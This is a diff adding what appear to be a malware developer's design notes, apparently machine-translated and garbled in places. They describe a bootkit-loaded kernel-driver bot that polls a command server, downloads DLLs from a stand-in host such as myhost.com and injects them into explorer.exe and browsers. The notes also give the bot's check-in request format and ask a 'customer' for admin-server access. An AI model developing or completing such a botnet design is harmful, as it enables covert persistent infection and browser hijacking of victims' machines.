@@ -1,0 +1,52 @@
+Kernel bot
+
+Currently implemented the following functionality:
+
+Bot is a driver that is loaded by the bootkit-loader. The driver contains a TCP \ IP stack and implementation of HTTP. 
+After initialization, the bot creates a timer that turns (via HTTP) to specified URL, pointing to a PHP script that returns the config file. 
+
+The config file contains commands such as:
+
+"DLL: http://myhost.com/myfile.dll file1.dll explorer.exe iexplore.exe firefox.exe"
+
+Bot downloads (over HTTP) file myhost.com/myfile.dll, stores it on how VFS file1.dll, and registers file1.dll for automatic injection produce in the process: explorer.exe, iexplore.exe, firefox.exe.
+
+What is needed for further development:
+
+1. To approve the format config file
+
+Who uses a plain text file described above. Perhaps it makes sense to add to the configuration file parameters 
+such as the server list for config line (Scripts and settings) to apply for a configuration file, the period of revolution of the config. 
+
+something else?
+
+You may want to use a converter (configurator) for converting a text configuration file to 
+specific format in order to remove the text from parser bot that will reduce its size and reduce the likelihood of errors.
+Format commands: Commands for adding a DLL to load, to remove the DLL, to update and. Commands work with the drivers ?:
+
+2. To approve the request format config
+
+Now the bot works with our test server, the request format is as follows:
+
+GET /config.php?version=100&user=1234&server=1&id=1000&crc=3201b37f
+
+where: version - version of the bot, 
+user - a unique client ID, 
+server - ID server, 
+id - Group bot, 
+crc - CRC32
+
+previous config (used to not issue a re-configuration)
+
+you need to change:
+- The type of request: GET or POST?
+- The name of the script that returns configuration
+- The parameters of script: ID of the client, the bot version, ID server, CRC32 previous config, something else?
+- Ext. HTTP request parameters: the operating system version and architecture (User-Agent), Referer, 
+
+3. Something else I did not realize ?
+
+If a customer is already working with the admin server , allowing config issue , then please give
+
+- A description of the format of the configuration
+- A description of the interaction also, please give temporary access to the server, to finalize the bot client protocols ,and subsequent testing.
